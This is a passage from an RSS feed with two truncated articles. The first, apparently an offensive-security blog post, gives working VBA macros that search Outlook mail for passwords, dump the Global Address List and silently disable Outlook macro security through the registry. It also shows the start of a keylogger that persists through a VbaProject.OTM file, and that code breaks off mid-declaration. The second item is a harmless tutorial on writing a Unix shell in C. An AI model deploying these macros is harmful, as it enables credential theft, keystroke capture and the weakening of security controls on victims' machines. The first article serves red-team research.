</code></pre></div></div> <p>If we do not want a copy in the ‚ÄúSent‚Äù folder we can set the property <code>DeleteAfterSubmit</code> as <em>True</em> after we set the <code>Body</code>. This will move directly the mail to the Deleted folder, so it is a bit more stealthy. To fully erradicate the mail we need to locate the mail (as item) inside the Deleted folder and then call the method <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.items.remove"><code>Remove</code></a> via MAPI.</p>  <p>The object <code>Outlook.Application</code> gives us also access to the namespace <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.application.getnamespace">MAPI</a> and all its methods. This is important because we can interact with the mail boxes without knowing the credentials. For example, we can use our macro to search all the received mails that contains the word ‚Äúpassword‚Äù in its body:</p> <div><div><pre><code><span>Sub</span> <span>retrieve_passwords</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>

    <span>Set</span> <span>myTasks</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetDefaultFolder</span><span>(</span><span>6</span><span>).</span><span>Items</span>
    <span>Dim</span> <span>i</span> <span>As</span> <span>Integer</span>
    <span>i</span> <span>=</span> <span>1</span>
    <span>For</span> <span>Each</span> <span>olMail</span> <span>In</span> <span>myTasks</span>
        <span>If</span> <span>(</span><span>InStr</span><span>(</span><span>1</span><span>,</span> <span>UCase</span><span>(</span><span>olMail</span><span>.</span><span>Body</span><span>),</span> <span>"PASSWORD"</span><span>,</span> <span>vbTextCompare</span><span>)</span> <span>&gt;</span> <span>0</span><span>)</span> <span>Then</span>
            <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>olMail</span><span>.</span><span>Body</span> <span>' Here we are just showing the info in the Excel sheets, but you can exfiltrate it as we saw before ;D</span>
            <span>i</span> <span>=</span> <span>i</span> <span>+</span> <span>1</span>
        <span>End</span> <span>If</span>
    <span>Next</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>Plaintext passwords inside mailboxes are probably one of the most common sins we are used to see in our engagements. A macro of this kind aimed to the right target can give you the Heaven‚Äôs keys.</p> <p>Another interesting information that we can get using MAPI is the Global Address List (GAL). In the address list we can find names, usernames, phone numbers, etc. Here we are just collecting usernames:</p> <div><div><pre><code><span>'https://www.excelcise.org/extract-outlook-global-address-list-details-with-vba/</span>
<span>Sub</span> <span>global_address_list</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>
    <span>Set</span> <span>outlGAL</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetGlobalAddressList</span><span>()</span>
    <span>Set</span> <span>outlEntry</span> <span>=</span> <span>outlGAL</span><span>.</span><span>AddressEntries</span>
        <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>

    <span>'loop through address entries and extract details</span>
    <span>For</span> <span>i</span> <span>=</span> <span>1</span> <span>To</span> <span>outlEntry</span><span>.</span><span>Count</span>
        <span>Set</span> <span>outlMember</span> <span>=</span> <span>outlEntry</span><span>.</span><span>Item</span><span>(</span><span>i</span><span>)</span>
        <span>If</span> <span>outlMember</span><span>.</span><span>AddressEntryUserType</span> <span>=</span> <span>olExchangeUserAddressEntry</span> <span>Then</span>
           <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>outlMember</span><span>.</span><span>GetExchangeUser</span><span>.</span><span>Name</span>  
        <span>End</span> <span>If</span>
    <span>Next</span> <span>i</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>The main issue is that retrieving this information <strong>can take a really long time</strong> if the company is big (we are talking about ~5-10 minutes), so it is a bit unpractical to be used in a real scenario. However both approaches can be executed <strong>inside</strong> Outlook via OTM files as we will see below.</p>  <p>In the last years various persistence methods related to Outlook were released and implemented in the tool <strong><a href="https://github.com/sensepost/ruler">Ruler</a></strong>. These methods were based on the execution of VBA code via <a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/">Custom Forms</a> and <a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/">Home Pages</a>. Both attacks are now patched, so we have to move forward.</p> <p>Recently <a href="https://twitter.com/domchell">Dominic Chell</a> published the article <a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a> where the persistence is achieved dropping a <strong>VbaProject.OTM</strong> file that is later loaded by Outlook. This is the path that we choosed here. But instead of using a payload to get a shell or parasite a process with our C2, we are going to create a keylogger in pure VBA <strong>:)</strong>.</p> <p>Outlook is one of the long term alive programs in an average office computer. It is launched since the workday beginning and is not closed until the worker leaves the office, so makes sense to use it as a keylogger. The plan is quite simple: we need to build an Excel file that modifies the registry (so Outlook can execute macros freely) and drops the OTM file with our keylogger.</p> <p>As the registry key is under <code>HKEY_CURRENT_USER</code> we do not need special privileges to modify the value (by default it is set at level 3 <em>Notifications for digitally signed macros, all other macros disabled</em>) so we enable the load and execution of macros by changing the value to 1 (<em>Enable all Macros</em>):</p> <div><div><pre><code><span>Sub</span> <span>disable_macro_security</span><span>()</span>
  <span>Dim</span> <span>myWS</span> <span>As</span> <span>Object</span>
  <span>Set</span> <span>myWS</span> <span>=</span> <span>VBA</span><span>.</span><span>CreateObject</span><span>(</span><span>"WScript.Shell"</span><span>)</span>
  <span>Dim</span> <span>name</span> <span>As</span> <span>String</span><span>,</span> <span>value</span> <span>As</span> <span>Integer</span><span>,</span> <span>stype</span> <span>As</span> <span>String</span>
  <span>name</span> <span>=</span> <span>"HKEY_CURRENT_USER\Software\Microsoft\Office\"</span> <span>&amp;</span> <span>Application</span><span>.</span><span>Version</span> <span>&amp;</span> <span>"\Outlook\Security\Level"</span>
  <span>value</span> <span>=</span> <span>1</span>
  <span>stype</span> <span>=</span> <span>"REG_DWORD"</span>
  <span>myWS</span><span>.</span><span>RegWrite</span> <span>name</span><span>,</span> <span>value</span><span>,</span> <span>stype</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We use the Excel version (<code>Application.Version</code>) to calculate the right location of the key to be modified. After that the OTM file can be dropped to <code>Environ("appdata") &amp; "\Microsoft\Outlook\VbaProject.OTM"</code> (it can be packed inside a resource, form, or taken directly from internet and then read/unpack and dropped). It is nothing new, all the good ol‚Äô techniques to drop files apply here, let‚Äôs move to the OTM contents and the keylogger.</p> <p>For our keylogger we are going to use the function <strong><code>NtUserGetRawInputData</code></strong> that is not documented in the MSDN. But as usual: if something is not covered by Microsoft, go and check ReactOS. Luckily it is <a href="https://doxygen.reactos.org/d0/dc0/ntstubs_8c.html#ad041c37a6375f9be19cac8f4636d468e">documented</a>:</p> <div><div><pre><code><span>DWORD</span> <span>APIENTRY</span> <span>NtUserGetRawInputData</span> 	<span>(</span> 	<span>HRAWINPUT</span>  	<span>hRawInput</span><span>,</span>
		<span>UINT</span>  	<span>uiCommand</span><span>,</span>
		<span>LPVOID</span>  	<span>pData</span><span>,</span>
		<span>PUINT</span>  	<span>pcbSize</span><span>,</span>
		<span>UINT</span>  	<span>cbSizeHeader</span> 
	<span>)</span> 	
</code></pre></div></div> <p>Also we can see that it is exported by <a href="https://strontic.github.io/xcyclopedia/library/win32u.dll-7D649393F89A9DE3058162F8442130BC.html#win32udll">win32u.dll</a>, so our definition in VBA will be:</p> <div><div><pre><code><span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHeader</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>LongLong</span>
</code></pre></div></div> <p>Our approach will be the well-known technique of creating a window with a callback to snoop messages until we get a <code>WM_INPUT</code> and then use <code>NtUserGetRawInputData</code> to get the input data. To build the structures correctly (like <code>RAWKEYBOARD</code>) we can use <strong><code>offsetof</code></strong> as we described in our article <a href="https://adepts.of0x.cc/vba-tools/">Shedding light on creating VBA macros</a>, so we can check the size of each field and pick VBA types accordingly.</p> <p>Our macro has to be split in two parts</p> <ol> <li>The default module <code>ThisOutlookSession</code></li> <li>Another module created by us that we will rename to <code>Keylogger</code>.</li> </ol> <p>In <code>ThisOutlookSession</code> we only place the trigger that will execute our payload when Outlook starts:</p> <div><div><pre><code><span>Sub</span> <span>Application_Startup</span><span>()</span>
   <span>Keylogger</span><span>.</span><span>launcher</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We need to place the ‚Äúreal‚Äù payload inside another module to be allowed to use the operator <strong><a href="https://docs.microsoft.com/es-es/office/vba/language/reference/user-interface-help/invalid-use-of-addressof-operator">AddressOf</a></strong>, because we use it to set the callback to our window class. The <code>Keylogger</code> module code (remember: <strong>this is just a PoC</strong> that does not handle errors/exceptions, the intention of this code is just to exemplify how to build one):</p> <div><div><pre><code><span>'This can be hidden using DispCallFunc trick</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterClassEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"RegisterClassExA"</span> <span>(</span><span>pcWndClassEx</span> <span>As</span> <span>WNDCLASSEX</span><span>)</span> <span>As</span> <span>Integer</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>CreateWindowEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"CreateWindowExA"</span> <span>(</span><span>ByVal</span> <span>dwExStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>lpClassName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>lpWindowName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>dwStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>x</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>y</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nWidth</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nHeight</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>hWndParent</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hMenu</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hInstance</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lpParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DefWindowProc</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DefWindowProcA"</span> <span>(</span><span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsg</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wParam</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"GetMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>,</span> <span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMin</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMax</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>TranslateMessage</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DispatchMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DispatchMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetModuleHandle</span> <span>Lib</span> <span>"kernel32"</span> <span>Alias</span> <span>"GetModuleHandleA"</span> <span>(</span><span>ByVal</span> <span>lpModuleName</span> <span>As</span> <span>String</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterRawInputDevices</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>ByRef</span> <span>pRawInputDevices</span> <span>As</span> <span>RAWINPUTDEVICE</span><span>,</span> <span>ByVal</span> <span>uiNumDevices</span> <span>As</span> <span>Integer</span><span>,</span> <span>ByVal</span> <span>cbSize</span> <span>As</span> <span>Integer</span><span>)</span> <span>As</span> <span>Boolean</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHead‚Ä¶</span></code></pre></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://adepts.of0x.cc/vba-outlook/">https://adepts.of0x.cc/vba-outlook/</a></em></p>]]>
            </description>
            <link>https://adepts.of0x.cc/vba-outlook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126067</guid>
            <pubDate>Sat, 13 Feb 2021 19:35:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tutorial ‚Äì Write a Shell in C]]>
            </title>
            <description>
<![CDATA[
Score 209 | Comments 48 (<a href="https://news.ycombinator.com/item?id=26126010">thread link</a>) | @mindcrime
<br/>
February 13, 2021 | https://brennan.io/2015/01/16/write-a-shell-in-c/ | <a href="https://web.archive.org/web/*/https://brennan.io/2015/01/16/write-a-shell-in-c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
<p><em>Stephen Brennan ‚Ä¢ 16 January 2015</em></p><p>It‚Äôs easy to view yourself as ‚Äúnot a <em>real</em> programmer.‚Äù  There are programs out
there that everyone uses, and it‚Äôs easy to put their developers on a pedestal.
Although developing large software projects isn‚Äôt easy, many times the basic
idea of that software is quite simple.  Implementing it yourself is a fun way to
show that you have what it takes to be a real programmer.  So, this is a
walkthrough on how I wrote my own simplistic Unix shell in C, in the hopes that
it makes other people feel that way too.</p>

<p>The code for the shell described here, dubbed <code>lsh</code>, is available on
<a href="https://github.com/brenns10/lsh">GitHub</a>.</p>

<p><strong>University students beware!</strong> Many classes have assignments that ask you to
write a shell, and some faculty are aware of this tutorial and code.  If you‚Äôre
a student in such a class, you shouldn‚Äôt copy (or copy then modify) this code
without permission.  And even then, I would <a href="https://brennan.io/2016/03/29/dishonesty/">advise</a> against heavily relying on this tutorial.</p>

<h2 id="basic-lifetime-of-a-shell">Basic lifetime of a shell</h2>

<p>Let‚Äôs look at a shell from the top down.  A shell does three main things in its
lifetime.</p>

<ul>
  <li><strong>Initialize</strong>: In this step, a typical shell would read and execute its
configuration files.  These change aspects of the shell‚Äôs behavior.</li>
  <li><strong>Interpret</strong>: Next, the shell reads commands from stdin (which could be
interactive, or a file) and executes them.</li>
  <li><strong>Terminate</strong>: After its commands are executed, the shell executes any
shutdown commands, frees up any memory, and terminates.</li>
</ul>

<p>These steps are so general that they could apply to many programs, but we‚Äôre
going to use them for the basis for our shell.  Our shell will be so simple that
there won‚Äôt be any configuration files, and there won‚Äôt be any shutdown command.
So, we‚Äôll just call the looping function and then terminate.  But in terms of
architecture, it‚Äôs important to keep in mind that the lifetime of the program is
more than just looping.</p>

<div><div><pre><code><span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>**</span><span>argv</span><span>)</span>
<span>{</span>
  <span>// Load config files, if any.
</span>
  <span>// Run command loop.
</span>  <span>lsh_loop</span><span>();</span>

  <span>// Perform any shutdown/cleanup.
</span>
  <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Here you can see that I just came up with a function, <code>lsh_loop()</code>, that will
loop, interpreting commands.  We‚Äôll see the implementation of that next.</p>

<h2 id="basic-loop-of-a-shell">Basic loop of a shell</h2>

<p>So we‚Äôve taken care of how the program should start up.  Now, for the basic
program logic: what does the shell do during its loop?  Well, a simple way to
handle commands is with three steps:</p>

<ul>
  <li><strong>Read</strong>: Read the command from standard input.</li>
  <li><strong>Parse</strong>: Separate the command string into a program and arguments.</li>
  <li><strong>Execute</strong>: Run the parsed command.</li>
</ul>

<p>Here, I‚Äôll translate those ideas into code for <code>lsh_loop()</code>:</p>

<div><div><pre><code><span>void</span> <span>lsh_loop</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span><span>;</span>
  <span>char</span> <span>**</span><span>args</span><span>;</span>
  <span>int</span> <span>status</span><span>;</span>

  <span>do</span> <span>{</span>
    <span>printf</span><span>(</span><span>"&gt; "</span><span>);</span>
    <span>line</span> <span>=</span> <span>lsh_read_line</span><span>();</span>
    <span>args</span> <span>=</span> <span>lsh_split_line</span><span>(</span><span>line</span><span>);</span>
    <span>status</span> <span>=</span> <span>lsh_execute</span><span>(</span><span>args</span><span>);</span>

    <span>free</span><span>(</span><span>line</span><span>);</span>
    <span>free</span><span>(</span><span>args</span><span>);</span>
  <span>}</span> <span>while</span> <span>(</span><span>status</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Let‚Äôs walk through the code.  The first few lines are just declarations.  The
do-while loop is more convenient for checking the status variable, because it
executes once before checking its value.  Within the loop, we print a prompt,
call a function to read a line, call a function to split the line into args, and
execute the args.  Finally, we free the line and arguments that we created
earlier.  Note that we‚Äôre using a status variable returned by <code>lsh_execute()</code> to
determine when to exit.</p>

<h2 id="reading-a-line">Reading a line</h2>

<p>Reading a line from stdin sounds so simple, but in C it can be a hassle.  The
sad thing is that you don‚Äôt know ahead of time how much text a user will enter
into their shell.  You can‚Äôt simply allocate a block and hope they don‚Äôt exceed
it.  Instead, you need to start with a block, and if they do exceed it,
reallocate with more space.  This is a common strategy in C, and we‚Äôll use it to
implement <code>lsh_read_line()</code>.</p>

<div><div><pre><code><span>#define LSH_RL_BUFSIZE 1024
</span><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
  <span>int</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>*</span><span>buffer</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>char</span><span>)</span> <span>*</span> <span>bufsize</span><span>);</span>
  <span>int</span> <span>c</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>
    <span>// Read a character
</span>    <span>c</span> <span>=</span> <span>getchar</span><span>();</span>

    <span>// If we hit EOF, replace it with a null character and return.
</span>    <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>EOF</span> <span>||</span> <span>c</span> <span>==</span> <span>'\n'</span><span>)</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>'\0'</span><span>;</span>
      <span>return</span> <span>buffer</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>c</span><span>;</span>
    <span>}</span>
    <span>position</span><span>++</span><span>;</span>

    <span>// If we have exceeded the buffer, reallocate.
</span>    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
      <span>buffer</span> <span>=</span> <span>realloc</span><span>(</span><span>buffer</span><span>,</span> <span>bufsize</span><span>);</span>
      <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The first part is a lot of declarations.  If you hadn‚Äôt noticed, I prefer to
keep the old C style of declaring variables before the rest of the code.  The
meat of the function is within the (apparently infinite) <code>while (1)</code> loop.  In
the loop, we read a character (and store it as an <code>int</code>, not a <code>char</code>, that‚Äôs
important!  EOF is an integer, not a character, and if you want to check for it,
you need to use an <code>int</code>.  This is a common beginner C mistake.).  If it‚Äôs the
newline, or EOF, we null terminate our current string and return it.  Otherwise,
we add the character to our existing string.</p>

<p>Next, we see whether the next character will go outside of our current buffer
size.  If so, we reallocate our buffer (checking for allocation errors) before
continuing.  And that‚Äôs really it.</p>

<p>Those who are intimately familiar with newer versions of the C library may note
that there is a <code>getline()</code> function in <code>stdio.h</code> that does most of the work we
just implemented.  To be completely honest, I didn‚Äôt know it existed until after
I wrote this code.  This function was a GNU extension to the C library until
2008, when it was added to the specification, so most modern Unixes should have
it now.  I‚Äôm leaving my existing code the way it is, and I encourage people to
learn it this way first before using <code>getline</code>.  You‚Äôd be robbing yourself of a
learning opportunity if you didn‚Äôt!  Anyhow, with <code>getline</code>, the function
becomes easier:</p>

<div><div><pre><code><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>ssize_t</span> <span>bufsize</span> <span>=</span> <span>0</span><span>;</span> <span>// have getline allocate a buffer for us
</span>
  <span>if</span> <span>(</span><span>getline</span><span>(</span><span>&amp;</span><span>line</span><span>,</span> <span>&amp;</span><span>bufsize</span><span>,</span> <span>stdin</span><span>)</span> <span>==</span> <span>-</span><span>1</span><span>){</span>
    <span>if</span> <span>(</span><span>feof</span><span>(</span><span>stdin</span><span>))</span> <span>{</span>
      <span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span>  <span>// We recieved an EOF
</span>    <span>}</span> <span>else</span>  <span>{</span>
      <span>perror</span><span>(</span><span>"readline"</span><span>);</span>
      <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>line</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is not 100% trivial because we still need to check for EOF or errors while
reading. EOF (end of file) means that either we were reading commands from a
text file which we‚Äôve reached the end of, or the user typed Ctrl-D, which
signals end-of-file. Either way, it means we should exit successfully, and if
any other error occurs, we should fail after printing the error.</p>

<h2 id="parsing-the-line">Parsing the line</h2>

<p>OK, so if we look back at the loop, we see that we now have implemented
<code>lsh_read_line()</code>, and we have the line of input.  Now, we need to parse that
line into a list of arguments.  I‚Äôm going to make a glaring simplification here,
and say that we won‚Äôt allow quoting or backslash escaping in our command line
arguments.  Instead, we will simply use whitespace to separate arguments from
each other.  So the command <code>echo "this message"</code> would not call echo with a
single argument <code>this message</code>, but rather it would call echo with two
arguments: <code>"this</code> and <code>message"</code>.</p>

<p>With those simplifications, all we need to do is ‚Äútokenize‚Äù the string using
whitespace as delimiters.  That means we can break out the classic library
function <code>strtok</code> to do some of the dirty work for us.</p>

<div><div><pre><code><span>#define LSH_TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"
</span><span>char</span> <span>**</span><span>lsh_split_line</span><span>(</span><span>char</span> <span>*</span><span>line</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_TOK_BUFSIZE</span><span>,</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>**</span><span>tokens</span> <span>=</span> <span>malloc</span><span>(</span><span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
  <span>char</span> <span>*</span><span>token</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>line</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>while</span> <span>(</span><span>token</span> <span>!=</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>token</span><span>;</span>
    <span>position</span><span>++</span><span>;</span>

    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_TOK_BUFSIZE</span><span>;</span>
      <span>tokens</span> <span>=</span> <span>realloc</span><span>(</span><span>tokens</span><span>,</span> <span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
      <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>

    <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>NULL</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>}</span>
  <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>return</span> <span>tokens</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>If this code looks suspiciously similar to <code>lsh_read_line()</code>, it‚Äôs because it
is!  We are using the same strategy of having a buffer and dynamically expanding
it.  But this time, we‚Äôre doing it with a null-terminated array of pointers
instead of a null-terminated array of characters.</p>

<p>At the start of the function, we begin tokenizing by calling <code>strtok</code>.  It
returns a pointer to the first token.  What <code>strtok()</code> actually does is return
pointers to within the string you give it, and place <code>\0</code> bytes at the end of
each token.  We store each pointer in an array (buffer) of character
pointers.</p>

<p>Finally, we reallocate the array of pointers if necessary.  The process repeats
until no token is returned by <code>strtok</code>, at which point we null-terminate the
list of tokens.</p>

<p>So, once all is said and done, we have an array of tokens, ready to execute.
Which begs the question, how do we do that?</p>



<p>Now, we‚Äôre really at the heart of what a shell does.  Starting processes is the
main function of shells.  So writing a shell means that you need to know exactly
what‚Äôs going on with processes and how they start.  That‚Äôs why I‚Äôm going to take
us on a short diversion to discuss processes in Unix.</p>

<p>There are only two ways of starting processes on Unix.  The first one (which
almost doesn‚Äôt count) is by being Init.  You see, when a Unix computer boots,
its kernel is loaded.  Once it is loaded and initialized, the kernel starts only
one process, which is called Init.  This process runs for the entire length of
time that the computer is on, and it manages loading up the rest of the
processes that you need for your computer to be useful.</p>

<p>Since most programs aren‚Äôt Init, that leaves only one practical way for
processes to get started: the <code>fork()</code> system call.  When ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://brennan.io/2015/01/16/write-a-shell-in-c/">https://brennan.io/2015/01/16/write-a-shell-in-c/</a></em></p>]]>
            </description>
            <link>https://brennan.io/2015/01/16/write-a-shell-in-c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126010</guid>
            <pubDate>Sat, 13 Feb 2021 19:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
